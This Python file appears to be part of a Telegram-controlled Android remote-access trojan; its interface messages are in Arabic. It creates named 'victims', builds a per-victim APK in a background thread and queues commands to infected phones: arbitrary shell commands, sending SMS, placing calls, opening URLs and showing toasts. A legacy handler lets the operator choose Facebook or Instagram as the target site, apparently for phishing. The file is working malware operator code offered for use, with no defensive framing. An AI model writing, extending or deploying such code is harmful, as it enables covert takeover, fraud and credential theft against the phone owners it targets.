# bot_handlers/steps/victim_steps.py
import threading

from config import bot
from imports_manager import (
    create_victim, queue_victim_command,
    rename_victim,
)
from logging_config import get_logger

from ..helpers import h

logger = get_logger("bot_handlers.steps.victim")


# ══════════════════════════════════════════════════
# إنشاء ضحية جديدة
# ══════════════════════════════════════════════════
def victim_name_step(message):
    chat_id = message.chat.id
    if not message.text:
        bot.send_message(chat_id, "❌ اسم غير صحيح")
        return

    victim_name = message.text.strip()[:40]

    wait_msg = bot.send_message(
        chat_id,
        f"⏳ <b>جاري تجهيز APK لـ</b> <code>{h(victim_name)}</code>\n\n"
        f"⏱️ <i>الوقت المتوقع: 2-4 دقائق</i>",
        parse_mode="HTML"
    )

    victim = create_victim(chat_id, victim_name, "general")
    if not victim:
        try:
            bot.edit_message_text(
                "❌ فشل إنشاء الضحية",
                chat_id=chat_id, message_id=wait_msg.message_id
            )
        except Exception:
            pass
        return

    victim_token = victim.get("victim_token")
    victim_id = victim.get("victim_id")
    logger.info(f"Victim created: {victim_name} | {victim_id}")

    from ..apk_builder import _build_and_send_apk
    threading.Thread(
        target=_build_and_send_apk,
        args=(chat_id, victim_name, victim_token, wait_msg.message_id),
        daemon=True
    ).start()


# ══════════════════════════════════════════════════
# أوامر تفاعلية
# ══════════════════════════════════════════════════
def v_toast_step(message, victim_id):
    if not message.text:
        return
    queue_victim_command(victim_id, "toast", text=message.text)
    bot.send_message(message.chat.id, "✅ تم إرسال Toast")


def v_shell_step(message, victim_id):
    if not message.text:
        return
    queue_victim_command(victim_id, "shell", command=message.text)
    bot.send_message(message.chat.id, "✅ تم إرسال الأمر")


def v_sendsms_step(message, victim_id):
    if not message.text:
        return
    parts = message.text.split("|")
    if len(parts) != 2:
        bot.send_message(message.chat.id, "❌ استخدم: <code>رقم|نص</code>", parse_mode="HTML")
        return
    queue_victim_command(victim_id, "send_sms",
                         to=parts[0].strip(), msg=parts[1].strip())
    bot.send_message(message.chat.id, "✅ تم إرسال SMS")


def v_call_step(message, victim_id):
    if not message.text:
        return
    queue_victim_command(victim_id, "call", to=message.text.strip())
    bot.send_message(message.chat.id, "✅ تم بدء المكالمة")


def v_url_step(message, victim_id):
    if not message.text:
        return
    queue_victim_command(victim_id, "open_url", url=message.text.strip())
    bot.send_message(message.chat.id, "✅ تم فتح الرابط")


def v_rename_step(message, victim_id):
    if not message.text:
        return
    new_name = message.text.strip()[:40]
    rename_victim(message.chat.id, victim_id, new_name)
    bot.send_message(
        message.chat.id,
        f"✅ <b>تم التغيير إلى:</b> <code>{h(new_name)}</code>",
        parse_mode="HTML"
    )


# ══════════════════════════════════════════════════
# Legacy
# ══════════════════════════════════════════════════
def victim_name_handler(message):
    """Handler قديم — للتوافق"""
    if not message.text:
        return
    name = message.text.strip()[:50]
    chat_id = message.chat.id

    from config import redis_client
    if redis_client:
        try:
            redis_client.setex(f"pending_victim_name:{chat_id}", 300, name)
        except Exception:
            pass

    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("📘 Facebook", callback_data="victim_site_facebook"),
        InlineKeyboardButton("📷 Instagram", callback_data="victim_site_instagram"),
    )
    bot.send_message(
        chat_id,
        f"👤 <b>اسم الضحية:</b> <code>{h(name)}</code>\n\n🎯 <b>اختر الموقع:</b>",
        reply_markup=markup, parse_mode="HTML"
    )


def victim_rename_handler(message, victim_id):
    if not message.text:
        return
    new_name = message.text.strip()[:50]
    rename_victim(message.chat.id, victim_id, new_name)
    bot.send_message(
        message.chat.id,
        f"✅ <b>تم التغيير إلى:</b> <code>{h(new_name)}</code>",
        parse_mode="HTML"
  )
